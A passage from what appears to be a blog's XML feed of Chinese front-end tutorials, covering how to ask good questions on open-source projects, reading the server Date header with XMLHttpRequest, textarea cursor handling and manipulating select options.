href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-11"></a><strong>描述目标、而不是过程</strong></h4><p>经常会有这种情况，提问者在脑袋里有个更高层次的目标，他们在自以为能达到目标的特定道路上卡住了，然后跑来问该怎么走。比如</p><blockquote><p>Sea.js 的 parseMap 方法在遇到 map 的多个配置项同时匹配同一个路径时，应该允许用户指定是全部生效还是仅第一个匹配的配置项生效。</p></blockquote><p>上面这个问题的背后，提问者实际上想解决的是如何通过 Sea.js 来做版本管理。提问者选择了通过 map 的方式来实现，但这过程中遇到了问题，因此跑过来继续怎么走。然而，如果只是描述过程，往往会把作者也绕进去。</p><p>实际情况却是，提问者选择的路本身就是一条崎岖之路，对于要解决的问题，实际上有更好的方式。这种情况下，描述清楚目标，讲清楚要干什么非常重要。</p><p>在描述自己是怎么做之前，一定要先描述要做什么。提问题时，What 往往比 How 更重要。</p><h4><a class="anchor" name="-12" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-12"></a><strong>要有具体场景</strong></h4><p>无论在开源社区，还是微博、知乎等平台上，有一种非常常见的问题：</p><blockquote><p>如何维护 JavaScript 代码？ 如何使用 Sea.js 进行模块化开发？</p></blockquote><p>这类问题还有很多，每每遇到，只能笑笑，然后悄悄地忽略掉。因此这类问题很难回答，就如下面这些问题一样：</p><blockquote><p>如何才能让生命有意义？ 如何打败淘宝？</p></blockquote><p>这类提问者，一般比较浮躁，经常对问题本身也没有经过思考。踏实的提问者，不会让问题浮在空中无法回答，而会在具体场景中让问题落地：</p><blockquote><p>我的项目有 20 多个 JS 文件，接下来还会急剧增加。目前遇到以下问题......（省略五百字）...... 请问如何维护？</p></blockquote><h4><a class="anchor" name="-13" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-13"></a><strong>仔细检查、确保准确</strong></h4><p>是人都会犯错误，特别是在如此快节奏的互联网环境下。好不容易把问题描述清楚时，不要急着立刻提交。在提交前，至少保证从头到尾再仔细阅读一遍，比如语法错误、错别字、标点符号、排版等等。做到这些，不光是尊重别人，也是尊重自己。</p><h3><a class="anchor" name="-14" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-14"></a>提问后</h3><p>提交问题后，建议通过邮件等方式订阅回复。互联网上最有效的沟通方式是异步沟通，不要期待作者马上回复，也不要心烦意乱着急地等待。出去看看天，数数云朵，你会逐步明白什么是风轻云淡。</p><h4><a class="anchor" name="-15" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-15"></a><strong>尽可能补充信息</strong></h4><p>在接收到回复时，仔细阅读。最经常的情况是，社区回复的，经常不是你想要的。比如</p><blockquote><p>根据你的描述，问题无法重现。能否提供具体使用环境和重现步骤？</p></blockquote><p>这时要淡定。仔细看看自己提交的问题描述是否足够清晰，如果有可补充的信息，尽量补充，以帮助作者能尽快定位问题。比如</p><blockquote><p>很抱歉，我前面有一步描述不正确，实际情况是我是在 IETester 中运行的......</p></blockquote><p>谦和淡定的交流，不光能帮助你解决问题，还有助于你结交更多朋友。</p><h4><a class="anchor" name="-16" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-16"></a><strong>适当的总结</strong></h4><p>当问题终于解决时，建议对问题进行总结。可以编辑原帖，也可以通过博客等方式总结。你的总结，会让遇到同样问题的朋友们受益，并且对自己的技能也是一种提高。前端业界，无论国内还是国外，有很多牛人之所以成为牛人，很大程度上都是因为有总结思考的好习惯。</p><h4><a class="anchor" name="-17" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-17"></a><strong>不要忘记感谢</strong></h4><p>最后，记得感谢。很多开源软件的作者，都是利用业余时间在创作代码。你的感谢，汇集许许多多大家的感谢，会让开源社区充满爱与力量。</p><h3><a class="anchor" name="-18" href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md#-18"></a>延伸阅读</h3><ul><li><a href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-cn.html">如何有效地报告 Bug</a></li><li><a href="http://www.wapm.cn/smart-questions/smart-questions-zh.html">提问的智慧</a></li><li><a href="http://code.google.com/p/cpyug/wiki/ZenForAsk">回答的智慧</a></li></ul><hr><p>最后的最后，如果你认可这篇文章，欢迎以各种形式转载。你的传播，能让整个开源社区更美好。</p><p>本文转自：<a href="//github.com/seajs/seajs/blob/master/CONTRIBUTING.md" target="_blank">github</a></p>]]></content>
      
      
      <categories>
          
          <category> 剪贴板 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 学会提问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用XMLHttpRequest响应头部的Date来做倒计时</title>
      <link href="/blog/2013/04/13/cb-readyState_3_interactive/"/>
      <url>/blog/2013/04/13/cb-readyState_3_interactive/</url>
      
        <content type="html"><![CDATA[<p><strong>关键词：</strong>倒计时 XMLHttpRequest readyState Date AJAX</p><h3>Problem [问题描述]</h3><p>先看看这个：（搜狗团购网站）</p><p><img src="https://images.cnitblog.com/blog/387325/201304/13132807-90d20866286944e282a80251a51c1893.png" alt=""></p><p>还剩多久多久，这个东西你是怎么做的。</p><h3>不推荐方案</h3><p><strong>脑残方案一：</strong></p><p><strong>　　</strong>把截止时间保存到cookie中，然后与现在时间做差值，进行比较。</p><p>　　<strong>方案评价：</strong></p><p>　　　　1. 如果用户cookie没开怎么办？</p><p>　　　　2. cookie不宜过多，cookie过期管理等麻烦！</p><p><strong>脑残方案二：</strong></p><p><strong>　　</strong>把服务器的本地时间作为参数送到客户端，然后js相关处理</p><p>　　<strong>方案评价：</strong></p><p>　　　　 因网络延迟等原因存在误差</p><p><strong>屌丝看完变高富帅^_^</strong></p><p>　 &nbsp;先给你看一张图：（向服务器请求的某个任意文件）</p><p><img src="https://images.cnitblog.com/blog/387325/201304/13133549-bdff65e110bc4489bcb7a88fcf7ec6dd.png" alt=""></p><p>好像有的同学瞬间就懂了。</p><p>是的，在请求头中就包含了服务器的标准时间。那么下一步就是怎么获取这个Date。</p><h3>XMLHttpRequert</h3><p>我们知道在XMLHttpRequest中用readyState来表示相应状态。</p><table class="table-view log-set-param"><tbody><tr><td><div class="para">0 （未初始化）</div></td><td><div class="para">对象已建立，但是尚未初始化（尚未调用open方法）</div></td></tr><tr><td><div class="para">1 （初始化）</div></td><td><div class="para">对象已建立，尚未调用send方法</div></td></tr><tr><td><div class="para">2 （发送数据）</div></td><td><div class="para">send方法已调用，但是当前的状态及http头未知</div></td></tr><tr><td><div class="para">3 （数据传送中）</div></td><td><div class="para">已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，</div></td></tr><tr><td><div class="para">4 （完成）</div></td><td><div class="para">数据接收完毕，此时可以通过通过responseBody和responseText获取完整的回应数据</div></td></tr></tbody></table><p>大家可能很少用到readyState为3这个状态，那么这个问题，就要用到他了。</p><h3>Solution [解决方案]</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript"> xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;testServer.txt&#x27;</span>, <span class="literal">true</span>); <span class="comment">//这里的testServer.txt，其实我没有创建，完全可以不需要这个文件，我们只是要时间罢了</span></span></span><br><span class="line"><span class="language-javascript"> xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">3</span>)&#123; <span class="comment">//状态3响应</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> header = xhr.<span class="title function_">getAllResponseHeaders</span>(); <span class="comment">//获得所有的头信息</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(header);<span class="comment">//会弹出一堆信息</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="title function_">getResponseHeader</span>(<span class="string">&#x27;Date&#x27;</span>)); <span class="comment">//弹出时间，那么可以利用获得的时间做倒计时程序了。</span></span></span><br><span class="line"><span class="language-javascript">     &#125;</span></span><br><span class="line"><span class="language-javascript"> &#125;</span></span><br><span class="line"><span class="language-javascript"> xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面看着懂大概的意思就行哈~</p><p><em>注：上述代码IE9以下版本不兼容，不清楚的童鞋自己百度AJAX兼容性等关键词。</em></p><h3>Reference [参考资料]</h3><p>　　1. <a href="http://blog.csdn.net/dxx1988/article/details/6948658" target="_blank">Exodia</a></p><p>　　2. <a href="http://baike.baidu.com/view/6987234.htm" target="_blank">百度文库</a></p><p>　　</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> XMLHttpRequest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript操控光标，你会么？</title>
      <link href="/blog/2013/04/11/cb-set_and_get_cursor_position/"/>
      <url>/blog/2013/04/11/cb-set_and_get_cursor_position/</url>
      
        <content type="html"><![CDATA[<p>QQ群里经常有人问怎么设置textarea中光标的位置，所见即所得中如果选中文本。如果你也不会，请往下看：</p><p><strong>关键词</strong>：javascript 光标 位置 鼠标取词 createRange getSelection</p><h3>getPosition</h3><p>先上代码，你也可以测试下效果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;测试&lt;/title&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    //&lt;![[</span><br><span class="line">       function getPosition() &#123;</span><br><span class="line">            var startPos = endPos = 0;</span><br><span class="line">            var element = document.getElementById(&quot;box&quot;);</span><br><span class="line">            if( document.selection ) &#123;</span><br><span class="line">                var range  = document.selection.createRange();</span><br><span class="line">                var drange = range.duplicate();</span><br><span class="line">                drange.moveToElementText( element );</span><br><span class="line">                drange.setEndPoint( &quot;EndToEnd&quot;, range );</span><br><span class="line">                startPos = drange.text.length - range.text.length;</span><br><span class="line">                endPos   = startPos + range.text.length;</span><br><span class="line">            &#125;else if( window.getSelection ) &#123;</span><br><span class="line">                startPos = element.selectionStart;</span><br><span class="line">                endPos   = element.selectionEnd;</span><br><span class="line">            &#125;</span><br><span class="line">            return &#123;</span><br><span class="line">                &quot;start&quot; : startPos,</span><br><span class="line">                &quot;end&quot;   : endPos</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        window.onload = function()&#123;</span><br><span class="line">            var element = document.getElementById(&quot;box&quot;);</span><br><span class="line"></span><br><span class="line">            element.onmouseup = function()&#123;</span><br><span class="line">                var pos = getPosition(),</span><br><span class="line">                    val = element.value.toString();</span><br><span class="line"></span><br><span class="line">                console.log(val.substring(pos.start, pos.end) || &quot;没有选中&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    //]]&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;textarea id=&quot;box&quot;&gt;木子Vs立青，性别男，爱好女，单身。&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><script type="text/javascript">// <![CDATA[function getPosition() {  var startPos = endPos = 0;  var element = document.getElementById("skyking-box");  if (document.selection) {    var range = document.selection.createRange();    var drange = range.duplicate();    drange.moveToElementText(element);    drange.setEndPoint("EndToEnd", range);    startPos = drange.text.length - range.text.length;    endPos = startPos + range.text.length;  } else if (window.getSelection) {    startPos = element.selectionStart;    endPos = element.selectionEnd;  }  return {    "start": startPos,    "end": endPos  }}function log(str) {  var lb = document.getElementById("skyking-log-box");  lb.innerHTML = lb.innerHTML + "<br /><strong style="color: blue;">&gt;</strong> " + str;}function showLog() {    var pos = getPosition(),        val = element.value.toString();    log(val.substring(pos.start, pos.end) || "没有选中");};// ]]&gt;</script><h3>selection <&nbsp;getSelection</h3><p>IE下的选择方式：判断方式（<strong>document.selection</strong>）</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">//获取选取<span class="built_in">var</span> <span class="built_in">range</span>  = document.selection.createRange();</span><br><span class="line"><span class="built_in">var</span> drange = <span class="built_in">range</span>.duplicate();</span><br><span class="line">drange.moveToElementText( element );</span><br><span class="line">drange.setEndPoint( <span class="string">&quot;EndToEnd&quot;</span>, <span class="built_in">range</span> );//获取<span class="built_in">position</span></span><br><span class="line">startPos = drange.text.<span class="built_in">length</span> - <span class="built_in">range</span>.text.<span class="built_in">length</span>;</span><br><span class="line">endPos   = startPos + <span class="built_in">range</span>.text.<span class="built_in">length</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较啰嗦，这代码也没啥意思，看了就忘，所以得多看多写，熟练了就好了。</p><p>下面是非IE的选择方式：判断方式（<strong>window.getSelection</strong>）</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">startPos</span> <span class="operator">=</span> element.selectionStart<span class="comment">;</span></span><br><span class="line"><span class="attribute">endPos</span>   <span class="operator">=</span> element.selectionEnd<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简练多了，是吧~</p><h3>设置光标位置</h3><p>这个就比较简单了，<strong>把 start 和 end 的值设置成一样就搞定了！</strong></p><p>chrome下：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">element.selectionStart <span class="operator">=</span> <span class="number">5</span><span class="comment">;</span></span><br><span class="line">element.selectionEnd <span class="operator">=</span> <span class="number">5</span><span class="comment">;</span></span><br><span class="line">element.focus()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IE下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">range</span> = document.selection.createRange();</span><br><span class="line"><span class="keyword">range</span>.collapse(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">range</span>.moveEnd(<span class="string">&#x27;character&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">range</span>.moveStart(<span class="string">&#x27;character&#x27;</span>, <span class="number">5</span>);</span><br><span class="line">element.focus();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给他们一个focus的目的就是为了聚焦到textarea上去，以便清晰看到光标已经成功设置了。</p><p>Demo我就不写了，相信应该有了大概的了解。</p><h3>写个Class，方便使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">var getObj = function ( id ) &#123;</span><br><span class="line">    //获取对象</span><br><span class="line">    var ele = document.getElementById(id);</span><br><span class="line">    //返回结果</span><br><span class="line">    return &#123;</span><br><span class="line">        element: ele,</span><br><span class="line">        startPos: 0,</span><br><span class="line">        endPos: 0,</span><br><span class="line">        init: function()&#123;</span><br><span class="line">            var _this = this;</span><br><span class="line">            if( !(&quot;__proto__&quot; in &#123;&#125;) )&#123;</span><br><span class="line">                this.element.attachEvent(&quot;onmouseup&quot;, _this.getPos);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                this.element.addEventListener(&quot;mouseup&quot;, _this.getPos, false);</span><br><span class="line">            &#125;</span><br><span class="line">            return this;</span><br><span class="line">        &#125;,</span><br><span class="line">        getPos: function () &#123;</span><br><span class="line">            var _this = this;</span><br><span class="line">            if( document.selection ) &#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    var range  = document.selection.createRange();</span><br><span class="line">                    var drange = range.duplicate();</span><br><span class="line">                    drange.moveToElementText( _this.element );</span><br><span class="line">                    drange.setEndPoint( &quot;EndToEnd&quot;, range );</span><br><span class="line">                    this.startPos = drange.text.length - range.text.length;</span><br><span class="line">                    this.endPos   = this.startPos + range.text.length;</span><br><span class="line">                &#125;catch(e)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else if( window.getSelection )&#123;</span><br><span class="line">                try&#123;</span><br><span class="line">                    this.startPos = this.element.selectionStart;</span><br><span class="line">                    this.endPos   = this.element.selectionEnd;</span><br><span class="line">                &#125;catch(e)&#123;</span><br><span class="line">                    //throw new Error(&quot;getPos error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return this;</span><br><span class="line">        &#125;,</span><br><span class="line">        setPos: function ( m, n ) &#123;</span><br><span class="line">            var arg2 = n || m;</span><br><span class="line">            if( document.selection ) &#123;</span><br><span class="line">                var range = document.selection.createRange();</span><br><span class="line">                range.collapse(true);</span><br><span class="line">                range.moveEnd(&#x27;character&#x27;, arg2);</span><br><span class="line">                range.moveStart(&#x27;character&#x27;, m);</span><br><span class="line">                this.element.focus();</span><br><span class="line">            &#125;else if( window.getSelection )&#123;</span><br><span class="line">                this.startPos = this.element.selectionStart = m;</span><br><span class="line">                this.endPos   = this.element.selectionEnd = arg2;</span><br><span class="line">                this.element.focus();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        getStr: function( m, n )&#123;</span><br><span class="line">            this.getPos( m, n );</span><br><span class="line">            return this.element.value.toString().slice(this.startPos, this.endPos);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很受伤，下次接着弄。<em>你也可以试试哈~</em></p><p>函数调用方式：</p><p>1. 初始化init()</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var t <span class="operator">=</span> getObj(<span class="string">&quot;box&quot;</span>).init()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2. setPos()</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//选中从m到n之间的内容</span></span><br><span class="line">t.set<span class="constructor">Pos(<span class="params">m</span>, <span class="params">n</span>)</span>;</span><br><span class="line"><span class="comment">//一个参数就是设置光标位置</span></span><br><span class="line">t.set<span class="constructor">Pos(<span class="params">m</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3. getPos()</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>这个算是一个内置函数，每次选择都自动调用了，可以不管</span><br><span class="line">t.getPos();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4. getStr()</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>获取选中的字符串</span><br><span class="line">t.getStr();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5. invoke()</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>执行你送入的函数</span><br><span class="line"><span class="keyword">function</span> yourFun()&#123;&#125;</span><br><span class="line"><span class="regexp">//</span>这个方法还没加进去，感觉用处也不大，原理就是使用call</span><br><span class="line">t.invoke(yourFun);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是不很了解IE的API，纠结了半天，又不愿意去看别人写的文档，先晾在这里，下次不全~</p><p><strong>本文未完，待续...</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摸透select和他的儿子们options</title>
      <link href="/blog/2013/04/11/cb-options_add_and_remove/"/>
      <url>/blog/2013/04/11/cb-options_add_and_remove/</url>
      
        <content type="html"><![CDATA[<p><strong>关键词：</strong>select option options selectedIndex remove add</p><p>关于select的→<a href="http://www.w3.org/2003/01/dom2-javadoc/org/w3c/dom/html2/HTMLSelectElement.html" target="_blank">API</a>，自己去看，不多说了。</p><h3>select < option < optgroup</h3><p>optgroup就是起到一个分组的作用。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--common--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;s1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;--s--&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span>----select----<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--multiple--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span> <span class="attr">id</span>=<span class="string">&quot;s2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--multiple+group--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span> <span class="attr">id</span>=<span class="string">&quot;s3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;g1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;g2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em>注：optgroup的属性用的是label，别搞错了。</em></p><p>上面三个一次效果图为</p><p><img src="https://images.cnitblog.com/blog/387325/201304/11133800-b58b53b315564d8489ebd6795a915864.png" alt=""></p><p>样式可以改，这个不多说。</p><h3>selectedIndex</h3><p>　　写的时候别向我一样犯2，我经常写成selectIndex，然后纠结哪里错了。。</p><p>　　前面展示了两类，后者为multiple，按住Ctrl键可以多选，但是selectedIndex只能选中一个，所以multiple的select不适合用（尽管是允许用的）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;s1&quot;</span>)；</span><br><span class="line">s1.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//如果你要写成this.options.selectedIndex，这也是没问题的  </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="variable language_">this</span>.<span class="property">selectedIndex</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>添加option</h3><p><strong>1.比较老的方法（兼容性不知道）：</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Option(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;value&quot;</span>,<span class="literal">false</span>,<span class="literal">true</span>);</span><br><span class="line">s1[s1.options.<span class="built_in">length</span>] = p;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>new Option第一个参数顾名思义就行了，第三个指的是defaultSelected属性，就是默认选中，第四个指的是selected属性，就是要不要选中。</p><p>兼容性不太清楚，不建议使用，而且四个参数过几天又忘了顺序或者涵义了。</p><p><strong>2.标准化的一些函数调用创建option</strong></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">var p = document.createElement(<span class="string">&quot;option&quot;</span>);         <span class="regexp">//</span>创建一个Element</span><br><span class="line">p.value = <span class="string">&quot;add&quot;</span>;  <span class="regexp">//</span>添加属性 推荐p.setAttribute(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;add&quot;</span>);</span><br><span class="line">p.appendChild(document.createTextNode(<span class="string">&quot;add&quot;</span>));    <span class="regexp">//</span>添加text</span><br><span class="line">s1.insertBefore(p, <span class="regexp">/*这里随便写的*/</span>s1.firstChild);  <span class="regexp">//</span>插入</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em>P.S：我在chrome下测试，上述最后一句代码改成insertAfter报错，所以大家在使用的时候尽量用insertBefore。</em></p><h3>删除option</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">var p = s1.item(<span class="number">2</span>); <span class="regexp">//</span>可以使用item来选择,也可以</span><br><span class="line">                    <span class="regexp">//</span>s1.getElementsByTagName(<span class="string">&quot;option&quot;</span>)[<span class="number">2</span>];</span><br><span class="line">p.parentElement.removeChild(p); <span class="regexp">//</span>删除节点</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>z-index bug IE6</h3><p>还有一个bug忘了说了，补上！</p><p>在IE6下，select的z-index属性总是比其他的元素也高，也就是说，只要你搞一个模拟弹框，就会发现一个select傻傻的浮到弹框之上，或者遮罩层出现一个闪亮的select元素，颇为恶心。</p><p><strong>解决方案：</strong></p><p>　　1. 极度屌丝，极度方便，极度省事，极度。。。。。<strong>把他隐藏</strong>！！！！，关闭弹出框之后<strong>再显示</strong></p><p>　　2. <strong>iframe包裹</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;me&quot;</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;name&quot;</span>&gt;</span>木子Vs立青<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>male<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">　　　　　　<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;age&quot;</span>&gt;</span>20<span class="tag">&lt;/<span 